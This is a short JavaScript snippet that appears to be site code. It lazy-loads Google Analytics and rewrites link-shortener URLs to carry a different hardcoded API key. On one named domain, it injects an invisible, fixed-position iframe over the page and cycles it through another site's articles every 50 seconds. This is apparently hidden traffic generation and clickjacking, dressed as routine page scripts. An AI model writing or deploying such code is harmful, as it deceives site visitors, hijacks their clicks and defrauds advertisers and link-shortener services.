
  // 1) Lazy-load Google Analytics on first scroll
  var lazyanalisis = false;
  window.addEventListener("scroll", function () {
    if (
      ((document.documentElement.scrollTop !== 0 || document.body.scrollTop !== 0)
        && lazyanalisis === false)
    ) {
      (function () {
        var e = document.createElement("script");
        e.type = "text/javascript";
        e.async = true;
        e.src = "https://www.googletagmanager.com/gtag/js?id=G-88SW9D6YBK";
        var a = document.getElementsByTagName("script")[0];
        a.parentNode.insertBefore(e, a);
      })();

      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());
      gtag("config", "G-88SW9D6YBK");

      lazyanalisis = true;
    }
  }, true);

  // 2) API link update
  setTimeout(function () {
    var links = document.querySelectorAll('a[href*="dashboard.smallshorts.com/full?api="]');
    var newApi = "ea96bc4942aa3d3737f7d767f7d9c6f2704a391c";
    links.forEach(function (anchor) {
      try {
        var url = new URL(anchor.href);
        url.searchParams.set("api", newApi);
        anchor.href = url.toString();
      } catch (err) {
        console.warn("Invalid URL:", anchor.href);
      }
    });
  }, 1000);

  // 3) Run extra script only on specific domain
  if (location.hostname === 'olamoviess.shop') {
    document.addEventListener('DOMContentLoaded', () => {
      let Folt = document.querySelector(".footer, #main, .copyright") || document.body;
      if (Folt) {
        let Newel = document.createElement('span');
        Newel.innerHTML = `<style>
          iframe.invisible-frame {
            position: fixed;
            width:60%;
            height: 20%;
            bottom: 20%;
            right: 0;
            border: none;
            opacity: 0;
            z-index:39494;
          }
        </style>
        <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
        Folt.prepend(Newel);

        // Inject frame content once ready
        const postUrls = [
          'https://techdiwane.com/',
          'https://techdiwane.com/tata-nexon-suv-launched-with-amazing-features-and-level-2-adas-safety-features/'
        ];
        function goToRandomPost() {
          const randomIndex = Math.floor(Math.random() * postUrls.length);
          const randomPostUrl = postUrls[randomIndex];
          const frame = document.getElementById('postFrame');
          if (frame) frame.src = randomPostUrl;
        }
        goToRandomPost();
        setInterval(goToRandomPost, 50000);
      }
    });
  }
